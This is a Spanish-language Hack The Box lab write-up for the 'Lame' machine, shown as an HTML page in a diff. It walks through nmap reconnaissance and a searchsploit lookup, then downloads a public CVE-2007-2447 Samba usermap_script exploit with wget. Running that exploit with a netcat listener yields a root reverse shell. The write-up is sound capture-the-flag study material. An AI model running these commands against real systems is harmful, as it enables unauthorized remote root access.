@@ -1,0 +1,134 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB-Lame — themaxterone</title>
+<meta name="description" content="WriteUp de la máquina HTB Lame – Type: Easy">
+<meta property="og:title" content="HTB-Lame — themaxterone">
+<meta property="og:description" content="WriteUp de la máquina HTB Lame – Type: Easy">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary">
+<meta name="theme-color" content="#07090c">
+<link rel="icon" href="../assets/images/maxteravatar.png">
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/site.css">
+
+</head>
+<body class="post-page">
+<div class="progress" aria-hidden="true"><div id="progress-bar"></div></div>
+<header class="site-header">
+  <div class="wrap nav">
+    <a class="brand" href="../" aria-label="themaxterone home"><img src="../assets/images/maxteravatar.png" alt="" width="32" height="32"><span><b>~/</b>themaxterone</span></a>
+    <button class="nav-toggle" type="button" aria-label="Toggle menu" aria-expanded="false"><span></span><span></span></button>
+    <nav class="nav-links" id="nav-links">
+      <a href="../">home</a>
+      <a href="../writeups/" class="active">write-ups</a>
+      <a href="../writeups/?cat=Scripts">tools</a>
+      <a href="../about/">about</a>
+      <a class="nav-cta" href="https://github.com/themaxterone" target="_blank" rel="noopener noreferrer">github ↗</a>
+    </nav>
+  </div>
+</header>
+<main>
+<header class="post-head">
+  <div class="wrap narrow">
+    <nav class="crumbs" aria-label="Breadcrumb"><a href="../">home</a> / <a href="../writeups/">write-ups</a> / <span>HTB-Lame</span></nav>
+    <p class="eyebrow"><span class="dot"></span> machine write-up</p>
+    <h1>HTB-Lame <img class="title-icon" src="../assets/images/hackthebox.webp" alt="" width="36" height="36"></h1>
+    <div class="card-meta"><time datetime="2022-04-01">Apr 01, 2022</time><span>·</span><span>2 min read</span></div>
+    <div class="chips"><a class="chip" href="../writeups/?tag=HTB">HTB</a><a class="chip" href="../writeups/?tag=Easy">Easy</a></div>
+  </div>
+</header>
+<div class="wrap post-layout">
+  <aside class="toc" aria-label="Table of contents"><p class="toc-title">// contents</p><ol><li><a href="#reconocimiento">Reconocimiento</a></li><li><a href="#explotación">Explotación</a></li></ol></aside>
+  <article class="prose" lang="es">
+<p><img src="../assets/images/writeups/lame/lame.png" alt="" loading="lazy"></p>
+<p><a href="https://app.hackthebox.com/machines/1" target="_blank" rel="noopener noreferrer">Maquina</a> </p>
+<h2 id="reconocimiento"><a class="anchor" href="#reconocimiento" aria-hidden="true">#</a>Reconocimiento</h2>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>nmap -sCV 10.10.10.3 --min-rate 5000 -Pn</code></pre></div>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.9
+|      Logged <span class="hljs-keyword">in</span> as ftp
+|      TYPE: ASCII
+|      No session bandwidth <span class="hljs-built_in">limit</span>
+|      Session <span class="hljs-built_in">timeout</span> <span class="hljs-keyword">in</span> seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:<span class="hljs-built_in">cd</span> (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-<span class="hljs-keyword">time</span>: Protocol negotiation failed (SMB2)
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: lame
+|   NetBIOS computer name: 
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+|_  System <span class="hljs-keyword">time</span>: 2022-04-01T06:53:09-04:00
+|_clock-skew: mean: 2h06m00s, deviation: 2h49m43s, median: 5m59s</code></pre></div>
+<p>Al mirar el resultado del nmap, vemos que el puerto <strong>139</strong> tiene un smb abierto y probablemente sea la misma versión que el puerto <strong>445</strong> por lo tanto buscamos un exploit en la base de datos <strong>searchsploit</strong>.</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>└─$ searchsploit samba 3.0                          
+
+ Exploit Title                                                                                     
+
+Samba 3.0.20 &lt; 3.0.25rc3 - <span class="hljs-string">&#x27;Username&#x27;</span> map script<span class="hljs-string">&#x27; Command Execution (Metasploit)                   </span></code></pre></div>
+<p>Aunque ponga que usa <strong>Metasploit</strong>, podemos buscar por google el script para poder usarlo sin <strong>Metasploit</strong> como por ejemplo: <a href="https://github.com/amriunix/CVE-2007-2447" target="_blank" rel="noopener noreferrer">CVE-2007-2447</a></p>
+<h2 id="explotación"><a class="anchor" href="#explotación" aria-hidden="true">#</a>Explotación</h2>
+<p>Nos descargamos el exploit:</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>wget https://raw.githubusercontent.com/amriunix/CVE-2007-2447/master/usermap_script.py</code></pre></div>
+<p>Para usarlo lo tiramos con <strong>python</strong> y tendremos que tener un <strong>netcat</strong> en escucha.</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>python usermap_script.py 10.10.10.3 139 10.10.14.9 443 <span class="hljs-comment">#ejecución</span>
+
+nc -lvp 443 <span class="hljs-comment">#netcat</span></code></pre></div>
+<p>Y el usuario que obtenemos en <strong>root</strong>.</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>root@lame:/# <span class="hljs-built_in">whoami</span>
+root
+root@lame:/# ifconfig
+eth0      Link encap:Ethernet  HWaddr 00:50:56:b9:68:4b  
+          inet addr:10.10.10.3  Bcast:10.10.10.255  Mask:255.255.255.0</code></pre></div>
+<p>Flag <strong>makis</strong>:</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>root@lame:/home/makis# <span class="hljs-built_in">ls</span>
+user.txt
+root@lame:/home/makis#</code></pre></div>
+<p>Flag <strong>root</strong>:</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>root@lame:/root# <span class="hljs-built_in">ls</span>
+Desktop  reset_logs.sh  root.txt  vnc.log
+root@lame:/root# </code></pre></div>
+
+<p><a class="btn btn-primary" href="https://github.com/amriunix/CVE-2007-2447" target="_blank" rel="noopener noreferrer">View on GitHub ↗</a></p>
+  </article>
+</div>
+<nav class="wrap narrow pager" aria-label="More posts">
+  <a href="../HTB-Granny/"><span>← older</span>HTB-Granny</a>
+  <a class="right" href="../HTB-Jerry/"><span>newer →</span>HTB-Jerry</a>
+</nav>
+</main>
+<footer class="site-footer">
+  <div class="wrap footer-inner">
+    <p><span class="prompt">$</span> echo "stay curious, stay legal"</p>
+    <p class="muted">© 2026 themaxterone · Hack The Box write-ups &amp; tools</p>
+    <p><a href="https://github.com/themaxterone" target="_blank" rel="noopener noreferrer">github.com/themaxterone</a></p>
+  </div>
+</footer>
+<script src="../assets/js/site.js" defer></script>
+</body>
+</html>
